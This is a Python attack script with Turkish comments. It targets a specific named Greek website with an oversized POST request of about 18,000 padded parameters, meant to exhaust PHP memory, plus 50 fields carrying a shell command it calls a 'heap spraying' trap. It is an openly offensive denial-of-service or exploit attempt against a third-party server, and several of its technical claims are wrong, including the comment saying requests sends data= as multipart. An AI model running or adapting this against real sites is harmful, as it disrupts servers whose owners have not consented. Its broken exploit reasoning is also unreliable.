import requests

TARGET_URL = "http://www.texni-gypsos.gr/?content=Products&section=15&subsection=1" 

print("[*] Geliştirilmiş PHP 8.4.26 OOM POST Testi Başlatılıyor...")

# Apache'nin 400 hatası vermemesi için başlıkları temiz tutuyoruz
headers = {
    "User-Agent": "Mozilla/5.0",
}

# PHP $_POST dizisini büyütecek form verileri (Payload)
# Hem parametre sayısı fazla olmalı hem de her parametre RAM'de yer kaplamalı
print("[*] Multipart form verileri hazırlanıyor...")
payload_data = {}

# 1. Aşama: Belleği 8M sınırının hemen altına (yaklaşık 7.8 MB) getirme
# 18.000 adet 300 karakterlik rastgele parametre üretiyoruz
for i in range(18000):
    uzun_parametre_adi = f"form_field_param_index_{i}_" + ("A" * 300)
    payload_data[uzun_parametre_adi] = "1"

# 2. Aşama: Tam 8M sınır çizgisine (Heap Spraying) tuzağı yerleştirme
print("[*] Sınır çizgisine tekrarlayan test komutları enjekte ediliyor...")
for x in range(50):
    tuzak_adi = f"tuzak_{x}_" + ("B" * 200)
    # Çalıştırılacak komut (Binary/Shellcode simülasyonu)
    payload_data[tuzak_adi] = "echo 'Zafiyet Tetiklendi' > /tmp/test.txt"


print("[*] Büyük POST isteği sunucuya gönderiliyor (Bekleyiniz)...")
# Veriyi 'data=' parametresiyle gönderdiğimizde requests bunu multipart form olarak iletir
response = requests.post(TARGET_URL, data=payload_data, headers=headers, timeout=1500)
print(response.text)
print(f"\n[+] Sunucu Yanıt Kodu: {response.status_code}")
print(f"[+] Sunucu Yanıtı: {response.text[:200]}")

